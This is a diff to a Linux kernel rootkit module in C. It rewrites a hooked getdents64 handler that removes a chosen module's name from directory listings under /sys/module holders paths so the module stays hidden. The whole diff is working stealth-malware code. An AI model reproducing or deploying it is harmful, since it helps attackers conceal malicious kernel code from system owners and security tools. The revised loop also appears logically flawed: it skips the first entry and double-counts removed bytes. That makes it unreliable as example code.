@@ -114,62 +114,54 @@ void notrace read_callback_func(unsigned long ip, unsigned long parent_ip, struc
 #pragma region get_dents64_hook
 int new_getdents64(const struct pt_regs *regs) {
     int total_bytes_read = original_getdents64_ptr(regs);
-    void *buff_pointer = (void*)regs->si;
-
-    bool has_been_found = false;
-    void *first;
 
     if (total_bytes_read > 0) {
-        first = kmalloc(total_bytes_read, GFP_KERNEL);
+        struct linux_dirent64 *buf_pointer = (struct linux_dirent64*)regs->si;
+        struct linux_dirent64 *first = kmalloc(total_bytes_read, GFP_KERNEL);
 
-        int copy_res = copy_from_user((void *)first, buff_pointer, (unsigned long)total_bytes_read);
+        int copy_res = copy_from_user(first, buf_pointer, (unsigned long)total_bytes_read);
         if (copy_res) {
             printk(KERN_ALERT "Error while copying from user space! error %d", copy_res);
-            kfree(first);
             return total_bytes_read;
         }
 
         struct linux_dirent64 *curr = first;
 
-        int i = 0;
-        while ((i < total_bytes_read) && (curr->d_reclen > 0)) {   
-            curr = first + i;
+        int bytes_left = total_bytes_read;
+        bool has_been_found = false;
+        while (bytes_left > 0) { 
+            bytes_left -= curr->d_reclen;
+            curr = (struct linux_dirent64*)(((char*)curr) + curr->d_reclen);
 
             struct file *file = fget((int)regs->di);
             if (file == NULL) {
                 continue;
             }
 
-            char *allocated_path_pointer;
-            allocated_path_pointer = kmalloc(PATH_MAX, GFP_KERNEL);
-            char *path;
-            path = d_path(&file->f_path, allocated_path_pointer, PATH_MAX);
+            char *allocated_path_pointer = kmalloc(PATH_MAX, GFP_KERNEL);
+            char *path = d_path(&file->f_path, allocated_path_pointer, PATH_MAX);
 
             if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, holders_path) != NULL) && (!strcmp(curr->d_name, mod_name_to_hide))) {
                 printk(KERN_ALERT "Hiding %s from %s using get_dents64", mod_name_to_hide, path);    
                 has_been_found = true;
-                int length_to_copy = total_bytes_read - i - curr->d_reclen;
 
-                // Array has been shortened by the length of the member we've just deleted.
+                // Array will be shortened by the length of the member we will delete.
                 total_bytes_read -= curr->d_reclen;
+                bytes_left -= curr->d_reclen;
                 
-                void *next_pos = first + i + curr->d_reclen;
-                memmove((void*)curr, next_pos, length_to_copy);
-                kfree(allocated_path_pointer);
-                fput(file);
-                continue;
+                struct linux_dirent64 *next_pos = (struct linux_dirent64*)(((char*)curr) + curr->d_reclen);
+                memmove(curr, next_pos, bytes_left);
             }
 
             kfree(allocated_path_pointer);
             fput(file);
-            i += curr->d_reclen;
+        }
+        
+        if (has_been_found) {
+            copy_to_user(buf_pointer, first, total_bytes_read);
         }
 
         kfree(first);
-    }
-
-    if (has_been_found) {
-        copy_to_user(buff_pointer, first, total_bytes_read);
     }
 
     return total_bytes_read;
